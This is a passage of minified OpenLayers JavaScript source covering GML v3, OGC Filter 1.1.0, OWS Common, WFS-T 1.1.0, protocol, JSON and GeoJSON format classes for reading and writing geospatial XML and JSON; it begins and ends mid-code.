b},lineStringMember:function(a){var b=this.createElementNSPlus(\"gml:lineStringMember\");this.writeNode(\"LineString\",a,b);return b},\nMultiPolygon:function(a){var b=this.createElementNSPlus(\"gml:MultiPolygon\");a=a.components||[a];for(var c=0,d=a.length;c<d;++c)this.writeNode(\"polygonMember\",a[c],b);return b},polygonMember:function(a){var b=this.createElementNSPlus(\"gml:polygonMember\");this.writeNode(\"Polygon\",a,b);return b},GeometryCollection:function(a){for(var b=this.createElementNSPlus(\"gml:GeometryCollection\"),c=0,d=a.components.length;c<d;++c)this.writeNode(\"geometryMember\",a.components[c],b);return b},geometryMember:function(a){var b=\nthis.createElementNSPlus(\"gml:geometryMember\");a=this.writeNode(\"feature:_geometry\",a);b.appendChild(a.firstChild);return b}},feature:{_typeName:function(a){var b=this.createElementNSPlus(\"feature:\"+this.featureType,{attributes:{fid:a.fid}});a.geometry&&this.writeNode(\"feature:_geometry\",a.geometry,b);for(var c in a.attributes){var d=a.attributes[c];null!=d&&this.writeNode(\"feature:_attribute\",{name:c,value:d},b)}return b},_geometry:function(a){this.externalProjection&&this.internalProjection&&(a=\na.clone().transform(this.internalProjection,this.externalProjection));var b=this.createElementNSPlus(\"feature:\"+this.geometryName);a=this.writeNode(\"gml:\"+this.geometryTypes[a.CLASS_NAME],a,b);this.srsName&&a.setAttribute(\"srsName\",this.srsName);return b},_attribute:function(a){return this.createElementNSPlus(\"feature:\"+a.name,{value:a.value})}},wfs:{FeatureCollection:function(a){for(var b=this.createElementNSPlus(\"wfs:FeatureCollection\"),c=0,d=a.length;c<d;++c)this.writeNode(\"gml:featureMember\",\na[c],b);return b}}},setGeometryTypes:function(){this.geometryTypes={\"OpenLayers.Geometry.Point\":\"Point\",\"OpenLayers.Geometry.MultiPoint\":\"MultiPoint\",\"OpenLayers.Geometry.LineString\":\"LineString\",\"OpenLayers.Geometry.MultiLineString\":\"MultiLineString\",\"OpenLayers.Geometry.Polygon\":\"Polygon\",\"OpenLayers.Geometry.MultiPolygon\":\"MultiPolygon\",\"OpenLayers.Geometry.Collection\":\"GeometryCollection\"}},CLASS_NAME:\"OpenLayers.Format.GML.Base\"});OpenLayers.Format.GML.v3=OpenLayers.Class(OpenLayers.Format.GML.Base,{schemaLocation:\"http://www.opengis.net/gml http://schemas.opengis.net/gml/3.1.1/profiles/gmlsfProfile/1.0.0/gmlsf.xsd\",curve:!1,multiCurve:!0,surface:!1,multiSurface:!0,initialize:function(a){OpenLayers.Format.GML.Base.prototype.initialize.apply(this,[a])},readers:{gml:OpenLayers.Util.applyDefaults({_inherit:function(a,b,c){if(a=parseInt(a.getAttribute(\"srsDimension\"),10)||c&&c.srsDimension)b.srsDimension=a},featureMembers:function(a,\nb){this.readChildNodes(a,b)},Curve:function(a,b){var c={points:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components||(b.components=[]);b.components.push(new OpenLayers.Geometry.LineString(c.points))},segments:function(a,b){this.readChildNodes(a,b)},LineStringSegment:function(a,b){var c={};this.readChildNodes(a,c);c.points&&Array.prototype.push.apply(b.points,c.points)},pos:function(a,b){var c=this.getChildValue(a).replace(this.regExes.trimSpace,\"\").split(this.regExes.splitSpace),\nc=this.xy?new OpenLayers.Geometry.Point(c[0],c[1],c[2]):new OpenLayers.Geometry.Point(c[1],c[0],c[2]);b.points=[c]},posList:function(a,b){for(var c=this.getChildValue(a).replace(this.regExes.trimSpace,\"\").split(this.regExes.splitSpace),d=b.srsDimension||parseInt(a.getAttribute(\"srsDimension\")||a.getAttribute(\"dimension\"),10)||2,e,f,g,h=Array(c.length/d),k=0,l=c.length;k<l;k+=d)e=c[k],f=c[k+1],g=2==d?void 0:c[k+2],h[k/d]=this.xy?new OpenLayers.Geometry.Point(e,f,g):new OpenLayers.Geometry.Point(f,\ne,g);b.points=h},Surface:function(a,b){this.readChildNodes(a,b)},patches:function(a,b){this.readChildNodes(a,b)},PolygonPatch:function(a,b){this.readers.gml.Polygon.apply(this,[a,b])},exterior:function(a,b){var c={};this.readChildNodes(a,c);b.outer=c.components[0]},interior:function(a,b){var c={};this.readChildNodes(a,c);b.inner.push(c.components[0])},MultiCurve:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);0<c.components.length&&(b.components=\n[new OpenLayers.Geometry.MultiLineString(c.components)])},curveMember:function(a,b){this.readChildNodes(a,b)},MultiSurface:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);0<c.components.length&&(b.components=[new OpenLayers.Geometry.MultiPolygon(c.components)])},surfaceMember:function(a,b){this.readChildNodes(a,b)},surfaceMembers:function(a,b){this.readChildNodes(a,b)},pointMembers:function(a,b){this.readChildNodes(a,b)},lineStringMembers:function(a,\nb){this.readChildNodes(a,b)},polygonMembers:function(a,b){this.readChildNodes(a,b)},geometryMembers:function(a,b){this.readChildNodes(a,b)},Envelope:function(a,b){var c={points:Array(2)};this.readChildNodes(a,c);b.components||(b.components=[]);var d=c.points[0],c=c.points[1];b.components.push(new OpenLayers.Bounds(d.x,d.y,c.x,c.y))},lowerCorner:function(a,b){var c={};this.readers.gml.pos.apply(this,[a,c]);b.points[0]=c.points[0]},upperCorner:function(a,b){var c={};this.readers.gml.pos.apply(this,\n[a,c]);b.points[1]=c.points[0]}},OpenLayers.Format.GML.Base.prototype.readers.gml),feature:OpenLayers.Format.GML.Base.prototype.readers.feature,wfs:OpenLayers.Format.GML.Base.prototype.readers.wfs},write:function(a){var b;b=OpenLayers.Util.isArray(a)?\"featureMembers\":\"featureMember\";a=this.writeNode(\"gml:\"+b,a);this.setAttributeNS(a,this.namespaces.xsi,\"xsi:schemaLocation\",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])},writers:{gml:OpenLayers.Util.applyDefaults({featureMembers:function(a){for(var b=\nthis.createElementNSPlus(\"gml:featureMembers\"),c=0,d=a.length;c<d;++c)this.writeNode(\"feature:_typeName\",a[c],b);return b},Point:function(a){var b=this.createElementNSPlus(\"gml:Point\");this.writeNode(\"pos\",a,b);return b},pos:function(a){return this.createElementNSPlus(\"gml:pos\",{value:this.xy?a.x+\" \"+a.y:a.y+\" \"+a.x})},LineString:function(a){var b=this.createElementNSPlus(\"gml:LineString\");this.writeNode(\"posList\",a.components,b);return b},Curve:function(a){var b=this.createElementNSPlus(\"gml:Curve\");\nthis.writeNode(\"segments\",a,b);return b},segments:function(a){var b=this.createElementNSPlus(\"gml:segments\");this.writeNode(\"LineStringSegment\",a,b);return b},LineStringSegment:function(a){var b=this.createElementNSPlus(\"gml:LineStringSegment\");this.writeNode(\"posList\",a.components,b);return b},posList:function(a){for(var b=a.length,c=Array(b),d,e=0;e<b;++e)d=a[e],c[e]=this.xy?d.x+\" \"+d.y:d.y+\" \"+d.x;return this.createElementNSPlus(\"gml:posList\",{value:c.join(\" \")})},Surface:function(a){var b=this.createElementNSPlus(\"gml:Surface\");\nthis.writeNode(\"patches\",a,b);return b},patches:function(a){var b=this.createElementNSPlus(\"gml:patches\");this.writeNode(\"PolygonPatch\",a,b);return b},PolygonPatch:function(a){var b=this.createElementNSPlus(\"gml:PolygonPatch\",{attributes:{interpolation:\"planar\"}});this.writeNode(\"exterior\",a.components[0],b);for(var c=1,d=a.components.length;c<d;++c)this.writeNode(\"interior\",a.components[c],b);return b},Polygon:function(a){var b=this.createElementNSPlus(\"gml:Polygon\");this.writeNode(\"exterior\",a.components[0],\nb);for(var c=1,d=a.components.length;c<d;++c)this.writeNode(\"interior\",a.components[c],b);return b},exterior:function(a){var b=this.createElementNSPlus(\"gml:exterior\");this.writeNode(\"LinearRing\",a,b);return b},interior:function(a){var b=this.createElementNSPlus(\"gml:interior\");this.writeNode(\"LinearRing\",a,b);return b},LinearRing:function(a){var b=this.createElementNSPlus(\"gml:LinearRing\");this.writeNode(\"posList\",a.components,b);return b},MultiCurve:function(a){var b=this.createElementNSPlus(\"gml:MultiCurve\");\na=a.components||[a];for(var c=0,d=a.length;c<d;++c)this.writeNode(\"curveMember\",a[c],b);return b},curveMember:function(a){var b=this.createElementNSPlus(\"gml:curveMember\");this.curve?this.writeNode(\"Curve\",a,b):this.writeNode(\"LineString\",a,b);return b},MultiSurface:function(a){var b=this.createElementNSPlus(\"gml:MultiSurface\");a=a.components||[a];for(var c=0,d=a.length;c<d;++c)this.writeNode(\"surfaceMember\",a[c],b);return b},surfaceMember:function(a){var b=this.createElementNSPlus(\"gml:surfaceMember\");\nthis.surface?this.writeNode(\"Surface\",a,b):this.writeNode(\"Polygon\",a,b);return b},Envelope:function(a){var b=this.createElementNSPlus(\"gml:Envelope\");this.writeNode(\"lowerCorner\",a,b);this.writeNode(\"upperCorner\",a,b);this.srsName&&b.setAttribute(\"srsName\",this.srsName);return b},lowerCorner:function(a){return this.createElementNSPlus(\"gml:lowerCorner\",{value:this.xy?a.left+\" \"+a.bottom:a.bottom+\" \"+a.left})},upperCorner:function(a){return this.createElementNSPlus(\"gml:upperCorner\",{value:this.xy?\na.right+\" \"+a.top:a.top+\" \"+a.right})}},OpenLayers.Format.GML.Base.prototype.writers.gml),feature:OpenLayers.Format.GML.Base.prototype.writers.feature,wfs:OpenLayers.Format.GML.Base.prototype.writers.wfs},setGeometryTypes:function(){this.geometryTypes={\"OpenLayers.Geometry.Point\":\"Point\",\"OpenLayers.Geometry.MultiPoint\":\"MultiPoint\",\"OpenLayers.Geometry.LineString\":!0===this.curve?\"Curve\":\"LineString\",\"OpenLayers.Geometry.MultiLineString\":!1===this.multiCurve?\"MultiLineString\":\"MultiCurve\",\"OpenLayers.Geometry.Polygon\":!0===\nthis.surface?\"Surface\":\"Polygon\",\"OpenLayers.Geometry.MultiPolygon\":!1===this.multiSurface?\"MultiPolygon\":\"MultiSurface\",\"OpenLayers.Geometry.Collection\":\"GeometryCollection\"}},CLASS_NAME:\"OpenLayers.Format.GML.v3\"});OpenLayers.Format.Filter.v1_1_0=OpenLayers.Class(OpenLayers.Format.GML.v3,OpenLayers.Format.Filter.v1,{VERSION:\"1.1.0\",schemaLocation:\"http://www.opengis.net/ogc/filter/1.1.0/filter.xsd\",initialize:function(a){OpenLayers.Format.GML.v3.prototype.initialize.apply(this,[a])},readers:{ogc:OpenLayers.Util.applyDefaults({PropertyIsEqualTo:function(a,b){var c=a.getAttribute(\"matchCase\"),c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.EQUAL_TO,matchCase:!(\"false\"===c||\"0\"===c)});this.readChildNodes(a,\nc);b.filters.push(c)},PropertyIsNotEqualTo:function(a,b){var c=a.getAttribute(\"matchCase\"),c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.NOT_EQUAL_TO,matchCase:!(\"false\"===c||\"0\"===c)});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsLike:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.LIKE});this.readChildNodes(a,c);var d=a.getAttribute(\"wildCard\"),e=a.getAttribute(\"singleChar\"),f=a.getAttribute(\"escapeChar\");c.value2regex(d,e,\nf);b.filters.push(c)}},OpenLayers.Format.Filter.v1.prototype.readers.ogc),gml:OpenLayers.Format.GML.v3.prototype.readers.gml,feature:OpenLayers.Format.GML.v3.prototype.readers.feature},writers:{ogc:OpenLayers.Util.applyDefaults({PropertyIsEqualTo:function(a){var b=this.createElementNSPlus(\"ogc:PropertyIsEqualTo\",{attributes:{matchCase:a.matchCase}});this.writeNode(\"PropertyName\",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsNotEqualTo:function(a){var b=this.createElementNSPlus(\"ogc:PropertyIsNotEqualTo\",\n{attributes:{matchCase:a.matchCase}});this.writeNode(\"PropertyName\",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsLike:function(a){var b=this.createElementNSPlus(\"ogc:PropertyIsLike\",{attributes:{matchCase:a.matchCase,wildCard:\"*\",singleChar:\".\",escapeChar:\"!\"}});this.writeNode(\"PropertyName\",a,b);this.writeNode(\"Literal\",a.regex2value(),b);return b},BBOX:function(a){var b=this.createElementNSPlus(\"ogc:BBOX\");a.property&&this.writeNode(\"PropertyName\",a,b);var c=this.writeNode(\"gml:Envelope\",\na.value);a.projection&&c.setAttribute(\"srsName\",a.projection);b.appendChild(c);return b},SortBy:function(a){for(var b=this.createElementNSPlus(\"ogc:SortBy\"),c=0,d=a.length;c<d;c++)this.writeNode(\"ogc:SortProperty\",a[c],b);return b},SortProperty:function(a){var b=this.createElementNSPlus(\"ogc:SortProperty\");this.writeNode(\"ogc:PropertyName\",a,b);this.writeNode(\"ogc:SortOrder\",\"DESC\"==a.order?\"DESC\":\"ASC\",b);return b},SortOrder:function(a){return this.createElementNSPlus(\"ogc:SortOrder\",{value:a})}},\nOpenLayers.Format.Filter.v1.prototype.writers.ogc),gml:OpenLayers.Format.GML.v3.prototype.writers.gml,feature:OpenLayers.Format.GML.v3.prototype.writers.feature},writeSpatial:function(a,b){var c=this.createElementNSPlus(\"ogc:\"+b);this.writeNode(\"PropertyName\",a,c);if(a.value instanceof OpenLayers.Filter.Function)this.writeNode(\"Function\",a.value,c);else{var d;d=a.value instanceof OpenLayers.Geometry?this.writeNode(\"feature:_geometry\",a.value).firstChild:this.writeNode(\"gml:Envelope\",a.value);a.projection&&\nd.setAttribute(\"srsName\",a.projection);c.appendChild(d)}return c},CLASS_NAME:\"OpenLayers.Format.Filter.v1_1_0\"});OpenLayers.Format.OWSCommon=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:\"1.0.0\",getVersion:function(a,b){var c=this.version;if(!c){var d=a.getAttribute(\"xmlns:ows\");d&&\"1.1\"===d.substring(d.lastIndexOf(\"/\")+1)&&(c=\"1.1.0\");c||(c=this.defaultVersion)}return c},CLASS_NAME:\"OpenLayers.Format.OWSCommon\"});OpenLayers.Format.OWSCommon.v1=OpenLayers.Class(OpenLayers.Format.XML,{regExes:{trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g},read:function(a,b){OpenLayers.Util.applyDefaults(b,this.options);var c={};this.readChildNodes(a,c);return c},readers:{ows:{Exception:function(a,b){var c={code:a.getAttribute(\"exceptionCode\"),locator:a.getAttribute(\"locator\"),texts:[]};b.exceptions.push(c);this.readChildNodes(a,c)},ExceptionText:function(a,b){var c=this.getChildValue(a);b.texts.push(c)},\nServiceIdentification:function(a,b){b.serviceIdentification={};this.readChildNodes(a,b.serviceIdentification)},Title:function(a,b){b.title=this.getChildValue(a)},Abstract:function(a,b){b[\"abstract\"]=this.getChildValue(a)},Keywords:function(a,b){b.keywords={};this.readChildNodes(a,b.keywords)},Keyword:function(a,b){b[this.getChildValue(a)]=!0},ServiceType:function(a,b){b.serviceType={codeSpace:a.getAttribute(\"codeSpace\"),value:this.getChildValue(a)}},ServiceTypeVersion:function(a,b){b.serviceTypeVersion=\nthis.getChildValue(a)},Fees:function(a,b){b.fees=this.getChildValue(a)},AccessConstraints:function(a,b){b.accessConstraints=this.getChildValue(a)},ServiceProvider:function(a,b){b.serviceProvider={};this.readChildNodes(a,b.serviceProvider)},ProviderName:function(a,b){b.providerName=this.getChildValue(a)},ProviderSite:function(a,b){b.providerSite=this.getAttributeNS(a,this.namespaces.xlink,\"href\")},ServiceContact:function(a,b){b.serviceContact={};this.readChildNodes(a,b.serviceContact)},IndividualName:function(a,\nb){b.individualName=this.getChildValue(a)},PositionName:function(a,b){b.positionName=this.getChildValue(a)},ContactInfo:function(a,b){b.contactInfo={};this.readChildNodes(a,b.contactInfo)},Phone:function(a,b){b.phone={};this.readChildNodes(a,b.phone)},Voice:function(a,b){b.voice=this.getChildValue(a)},Address:function(a,b){b.address={};this.readChildNodes(a,b.address)},DeliveryPoint:function(a,b){b.deliveryPoint=this.getChildValue(a)},City:function(a,b){b.city=this.getChildValue(a)},AdministrativeArea:function(a,\nb){b.administrativeArea=this.getChildValue(a)},PostalCode:function(a,b){b.postalCode=this.getChildValue(a)},Country:function(a,b){b.country=this.getChildValue(a)},ElectronicMailAddress:function(a,b){b.electronicMailAddress=this.getChildValue(a)},Role:function(a,b){b.role=this.getChildValue(a)},OperationsMetadata:function(a,b){b.operationsMetadata={};this.readChildNodes(a,b.operationsMetadata)},Operation:function(a,b){var c=a.getAttribute(\"name\");b[c]={};this.readChildNodes(a,b[c])},DCP:function(a,\nb){b.dcp={};this.readChildNodes(a,b.dcp)},HTTP:function(a,b){b.http={};this.readChildNodes(a,b.http)},Get:function(a,b){b.get||(b.get=[]);var c={url:this.getAttributeNS(a,this.namespaces.xlink,\"href\")};this.readChildNodes(a,c);b.get.push(c)},Post:function(a,b){b.post||(b.post=[]);var c={url:this.getAttributeNS(a,this.namespaces.xlink,\"href\")};this.readChildNodes(a,c);b.post.push(c)},Parameter:function(a,b){b.parameters||(b.parameters={});var c=a.getAttribute(\"name\");b.parameters[c]={};this.readChildNodes(a,\nb.parameters[c])},Constraint:function(a,b){b.constraints||(b.constraints={});var c=a.getAttribute(\"name\");b.constraints[c]={};this.readChildNodes(a,b.constraints[c])},Value:function(a,b){b[this.getChildValue(a)]=!0},OutputFormat:function(a,b){b.formats.push({value:this.getChildValue(a)});this.readChildNodes(a,b)},WGS84BoundingBox:function(a,b){var c={};c.crs=a.getAttribute(\"crs\");b.BoundingBox?b.BoundingBox.push(c):(b.projection=c.crs,c=b);this.readChildNodes(a,c)},BoundingBox:function(a,b){this.readers.ows.WGS84BoundingBox.apply(this,\n[a,b])},LowerCorner:function(a,b){var c=this.getChildValue(a).replace(this.regExes.trimSpace,\"\"),c=c.replace(this.regExes.trimComma,\",\"),c=c.split(this.regExes.splitSpace);b.left=c[0];b.bottom=c[1]},UpperCorner:function(a,b){var c=this.getChildValue(a).replace(this.regExes.trimSpace,\"\"),c=c.replace(this.regExes.trimComma,\",\"),c=c.split(this.regExes.splitSpace);b.right=c[0];b.top=c[1];b.bounds=new OpenLayers.Bounds(b.left,b.bottom,b.right,b.top);delete b.left;delete b.bottom;delete b.right;delete b.top},\nLanguage:function(a,b){b.language=this.getChildValue(a)}}},writers:{ows:{BoundingBox:function(a,b){var c=this.createElementNSPlus(b||\"ows:BoundingBox\",{attributes:{crs:a.projection}});this.writeNode(\"ows:LowerCorner\",a,c);this.writeNode(\"ows:UpperCorner\",a,c);return c},LowerCorner:function(a){return this.createElementNSPlus(\"ows:LowerCorner\",{value:a.bounds.left+\" \"+a.bounds.bottom})},UpperCorner:function(a){return this.createElementNSPlus(\"ows:UpperCorner\",{value:a.bounds.right+\" \"+a.bounds.top})},\nIdentifier:function(a){return this.createElementNSPlus(\"ows:Identifier\",{value:a})},Title:function(a){return this.createElementNSPlus(\"ows:Title\",{value:a})},Abstract:function(a){return this.createElementNSPlus(\"ows:Abstract\",{value:a})},OutputFormat:function(a){return this.createElementNSPlus(\"ows:OutputFormat\",{value:a})}}},CLASS_NAME:\"OpenLayers.Format.OWSCommon.v1\"});OpenLayers.Format.OWSCommon.v1_0_0=OpenLayers.Class(OpenLayers.Format.OWSCommon.v1,{namespaces:{ows:\"http://www.opengis.net/ows\",xlink:\"http://www.w3.org/1999/xlink\"},readers:{ows:OpenLayers.Util.applyDefaults({ExceptionReport:function(a,b){b.success=!1;b.exceptionReport={version:a.getAttribute(\"version\"),language:a.getAttribute(\"language\"),exceptions:[]};this.readChildNodes(a,b.exceptionReport)}},OpenLayers.Format.OWSCommon.v1.prototype.readers.ows)},writers:{ows:OpenLayers.Format.OWSCommon.v1.prototype.writers.ows},\nCLASS_NAME:\"OpenLayers.Format.OWSCommon.v1_0_0\"});OpenLayers.Format.WFST.v1_1_0=OpenLayers.Class(OpenLayers.Format.Filter.v1_1_0,OpenLayers.Format.WFST.v1,{version:\"1.1.0\",schemaLocations:{wfs:\"http://schemas.opengis.net/wfs/1.1.0/wfs.xsd\"},initialize:function(a){OpenLayers.Format.Filter.v1_1_0.prototype.initialize.apply(this,[a]);OpenLayers.Format.WFST.v1.prototype.initialize.apply(this,[a])},readNode:function(a,b,c){return OpenLayers.Format.GML.v3.prototype.readNode.apply(this,arguments)},readers:{wfs:OpenLayers.Util.applyDefaults({FeatureCollection:function(a,\nb){b.numberOfFeatures=parseInt(a.getAttribute(\"numberOfFeatures\"));OpenLayers.Format.WFST.v1.prototype.readers.wfs.FeatureCollection.apply(this,arguments)},TransactionResponse:function(a,b){b.insertIds=[];b.success=!1;this.readChildNodes(a,b)},TransactionSummary:function(a,b){b.success=!0},InsertResults:function(a,b){this.readChildNodes(a,b)},Feature:function(a,b){var c={fids:[]};this.readChildNodes(a,c);b.insertIds.push(c.fids[0])}},OpenLayers.Format.WFST.v1.prototype.readers.wfs),gml:OpenLayers.Format.GML.v3.prototype.readers.gml,\nfeature:OpenLayers.Format.GML.v3.prototype.readers.feature,ogc:OpenLayers.Format.Filter.v1_1_0.prototype.readers.ogc,ows:OpenLayers.Format.OWSCommon.v1_0_0.prototype.readers.ows},writers:{wfs:OpenLayers.Util.applyDefaults({GetFeature:function(a){var b=OpenLayers.Format.WFST.v1.prototype.writers.wfs.GetFeature.apply(this,arguments);a&&this.setAttributes(b,{resultType:a.resultType,startIndex:a.startIndex,count:a.count});return b},Query:function(a){a=OpenLayers.Util.extend({featureNS:this.featureNS,\nfeaturePrefix:this.featurePrefix,featureType:this.featureType,srsName:this.srsName},a);var b=a.featurePrefix,c=this.createElementNSPlus(\"wfs:Query\",{attributes:{typeName:(b?b+\":\":\"\")+a.featureType,srsName:a.srsName}});a.featureNS&&c.setAttribute(\"xmlns:\"+b,a.featureNS);if(a.propertyNames)for(var b=0,d=a.propertyNames.length;b<d;b++)this.writeNode(\"wfs:PropertyName\",{property:a.propertyNames[b]},c);a.filter&&(OpenLayers.Format.WFST.v1_1_0.prototype.setFilterProperty.call(this,a.filter),this.writeNode(\"ogc:Filter\",\na.filter,c));return c},PropertyName:function(a){return this.createElementNSPlus(\"wfs:PropertyName\",{value:a.property})}},OpenLayers.Format.WFST.v1.prototype.writers.wfs),gml:OpenLayers.Format.GML.v3.prototype.writers.gml,feature:OpenLayers.Format.GML.v3.prototype.writers.feature,ogc:OpenLayers.Format.Filter.v1_1_0.prototype.writers.ogc},CLASS_NAME:\"OpenLayers.Format.WFST.v1_1_0\"});OpenLayers.Protocol=OpenLayers.Class({format:null,options:null,autoDestroy:!0,defaultFilter:null,initialize:function(a){a=a||{};OpenLayers.Util.extend(this,a);this.options=a},mergeWithDefaultFilter:function(a){return a&&this.defaultFilter?new OpenLayers.Filter.Logical({type:OpenLayers.Filter.Logical.AND,filters:[this.defaultFilter,a]}):a||this.defaultFilter||void 0},destroy:function(){this.format=this.options=null},read:function(a){a=a||{};a.filter=this.mergeWithDefaultFilter(a.filter)},create:function(){},\nupdate:function(){},\"delete\":function(){},commit:function(){},abort:function(a){},createCallback:function(a,b,c){return OpenLayers.Function.bind(function(){a.apply(this,[b,c])},this)},CLASS_NAME:\"OpenLayers.Protocol\"});OpenLayers.Protocol.Response=OpenLayers.Class({code:null,requestType:null,last:!0,features:null,data:null,reqFeatures:null,priv:null,error:null,initialize:function(a){OpenLayers.Util.extend(this,a)},success:function(){return 0<this.code},CLASS_NAME:\"OpenLayers.Protocol.Response\"});\nOpenLayers.Protocol.Response.SUCCESS=1;OpenLayers.Protocol.Response.FAILURE=0;OpenLayers.Format.JSON=OpenLayers.Class(OpenLayers.Format,{indent:\"    \",space:\" \",newline:\"\\n\",level:0,pretty:!1,nativeJSON:function(){return!(!window.JSON||\"function\"!=typeof JSON.parse||\"function\"!=typeof JSON.stringify)}(),read:function(a,b){var c;if(this.nativeJSON)c=JSON.parse(a,b);else try{if(/^[\\],:{}\\s]*$/.test(a.replace(/\\\\[\"\\\\\\/bfnrtu]/g,\"@\").replace(/\"[^\"\\\\\\n\\r]*\"|true|false|null|-?\\d+(?:\\.\\d*)?(?:[eE][+\\-]?\\d+)?/g,\"]\").replace(/(?:^|:|,)(?:\\s*\\[)+/g,\"\"))&&(c=eval(\"(\"+a+\")\"),\"function\"===\ntypeof b)){var d=function(a,c){if(c&&\"object\"===typeof c)for(var e in c)c.hasOwnProperty(e)&&(c[e]=d(e,c[e]));return b(a,c)};c=d(\"\",c)}}catch(e){}this.keepData&&(this.data=c);return c},write:function(a,b){this.pretty=!!b;var c=null,d=typeof a;if(this.serialize[d])try{c=!this.pretty&&this.nativeJSON?JSON.stringify(a):this.serialize[d].apply(this,[a])}catch(e){OpenLayers.Console.error(\"Trouble serializing: \"+e)}return c},writeIndent:function(){var a=[];if(this.pretty)for(var b=0;b<this.level;++b)a.push(this.indent);\nreturn a.join(\"\")},writeNewline:function(){return this.pretty?this.newline:\"\"},writeSpace:function(){return this.pretty?this.space:\"\"},serialize:{object:function(a){if(null==a)return\"null\";if(a.constructor==Date)return this.serialize.date.apply(this,[a]);if(a.constructor==Array)return this.serialize.array.apply(this,[a]);var b=[\"{\"];this.level+=1;var c,d,e,f=!1;for(c in a)a.hasOwnProperty(c)&&(d=OpenLayers.Format.JSON.prototype.write.apply(this,[c,this.pretty]),e=OpenLayers.Format.JSON.prototype.write.apply(this,\n[a[c],this.pretty]),null!=d&&null!=e&&(f&&b.push(\",\"),b.push(this.writeNewline(),this.writeIndent(),d,\":\",this.writeSpace(),e),f=!0));this.level-=1;b.push(this.writeNewline(),this.writeIndent(),\"}\");return b.join(\"\")},array:function(a){var b,c=[\"[\"];this.level+=1;for(var d=0,e=a.length;d<e;++d)b=OpenLayers.Format.JSON.prototype.write.apply(this,[a[d],this.pretty]),null!=b&&(0<d&&c.push(\",\"),c.push(this.writeNewline(),this.writeIndent(),b));this.level-=1;c.push(this.writeNewline(),this.writeIndent(),\n\"]\");return c.join(\"\")},string:function(a){var b={\"\\b\":\"\\\\b\",\"\\t\":\"\\\\t\",\"\\n\":\"\\\\n\",\"\\f\":\"\\\\f\",\"\\r\":\"\\\\r\",'\"':'\\\\\"',\"\\\\\":\"\\\\\\\\\"};return/[\"\\\\\\x00-\\x1f]/.test(a)?'\"'+a.replace(/([\\x00-\\x1f\\\\\"])/g,function(a,d){var e=b[d];if(e)return e;e=d.charCodeAt();return\"\\\\u00\"+Math.floor(e/16).toString(16)+(e%16).toString(16)})+'\"':'\"'+a+'\"'},number:function(a){return isFinite(a)?String(a):\"null\"},\"boolean\":function(a){return String(a)},date:function(a){function b(a){return 10>a?\"0\"+a:a}return'\"'+a.getFullYear()+\n\"-\"+b(a.getMonth()+1)+\"-\"+b(a.getDate())+\"T\"+b(a.getHours())+\":\"+b(a.getMinutes())+\":\"+b(a.getSeconds())+'\"'}},CLASS_NAME:\"OpenLayers.Format.JSON\"});OpenLayers.Format.GeoJSON=OpenLayers.Class(OpenLayers.Format.JSON,{ignoreExtraDims:!1,read:function(a,b,c){b=b?b:\"FeatureCollection\";var d=null,e=null,e=\"string\"==typeof a?OpenLayers.Format.JSON.prototype.read.apply(this,[a,c]):a;if(!e)OpenLayers.Console.error(\"Bad JSON: \"+a);else if(\"string\"!=typeof e.type)OpenLayers.Console.error(\"Bad GeoJSON - no type: \"+a);else if(this.isValidType(e,b))switch(b){case \"Geometry\":try{d=this.parseGeometry(e)}catch(f){OpenLayers.Console.error(f)}break;case \"Feature\":try{d=\nthis.parseFeature(e),d.type=\"Feature\"}catch(g){OpenLayers.Console.error(g)}break;case \"FeatureCollection\":switch(d=[],e.type){case \"Feature\":try{d.push(this.parseFeature(e))}catch(h){d=null,OpenLayers.Console.error(h)}break;case \"FeatureCollection\":a=0;for(b=e.features.length;a<b;++a)try{d.push(this.parseFeature(e.features[a]))}catch(k){d=null,OpenLayers.Console.error(k)}break;default:try{var l=this.parseGeometry(e);d.push(new OpenLayers.Feature.Vector(l))}catch(m){d=null,OpenLayers.Console.error(m)}}}return d},\nisValidType:function(a,b){var c=!1;switch(b){case \"Geometry\":-1==OpenLayers.Util.indexOf(\"Point MultiPoint LineString MultiLineString Polygon MultiPolygon Box GeometryCollection\".split(\" \"),a.type)?OpenLayers.Console.error(\"Unsupported geometry type: \"+a.type):c=!0;break;case \"FeatureCollection\":c=!0;break;default:a.type==b?c=!0:OpenLayers.Console.error(\"Cannot convert types from \"+a.type+\" to \"+b)}return c},parseFeature:function(a){var b,c,d;c=a.properties?a.properties:{};d=a.geometry&&a.geometry.bbox||\na.bbox;try{b=this.parseGeometry(a.geometry)}catch(e){throw e;}b=new OpenLayers.Feature.Vector(b,c);d&&(b.bounds=OpenLayers.Bounds.fromArray(d));a.id&&(b.fid=a.id);return b},parseGeometry:function(a){if(null==a)return null;var b,c=!1;if(\"GeometryCollection\"==a.type){if(!OpenLayers.Util.isArray(a.geometries))throw\"GeometryCollection must have geometries array: \"+a;b=a.geometries.length;for(var c=Array(b),d=0;d<b;++d)c[d]=this.parseGeometry.apply(this,[a.geometries[d]]);b=new OpenLayers.Geometry.Collection(c);\nc=!0}else{if(!OpenLayers.Util.isArray(a.coordinates))throw\"Geometry must have coordinates array: \"+a;if(!this.parseCoords[a.type.toLowerCase()])throw\"Unsupported geometry type: \"+a.type;try{b=this.parseCoords[a.type.toLowerCase()].apply(this,[a.coordinates])}catch(e){throw e;}}this.internalProjection&&(this.externalProjection&&!c)&&b.transform(this.externalProjection,this.internalProjection);return b},parseCoords:{point:function(a){if(!1==this.ignoreExtraDims&&2!=a.length)throw\"Only 2D points are supported: \"+\na;return new OpenLayers.Geometry.Point(a[0],a[1])},multipoint:function(a){for(var b=[],c=null,d=0,e=a.length;d<e;++d){try{c=this.parseCoords.point.apply(this,[a[d]])}catch(f){throw f;}b.push(c)}return new OpenLayers.Geometry.MultiPoint(b)},linestring:function(a){for(var 